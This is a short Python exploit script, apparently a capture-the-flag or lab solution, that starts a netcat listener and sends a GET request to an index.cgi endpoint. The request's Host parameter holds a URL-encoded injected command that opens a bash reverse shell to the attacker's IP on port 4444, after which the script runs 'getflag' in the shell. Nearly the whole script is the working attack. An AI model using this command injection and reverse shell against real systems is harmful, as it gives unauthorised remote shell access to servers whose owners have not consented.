#!/usr/bin/python3

from requests import get
from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target IP Local IP") 

local_pro = process(['nc','-nvlp','4444'])
try:
	get(f'http://192.168.56.105:7007/index.cgi?Host=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{argv[2]}%2F4444%200%3E%261%3B%23',timeout=1)
except:
	local_pro.sendline('getflag')
	local_pro.interactive()

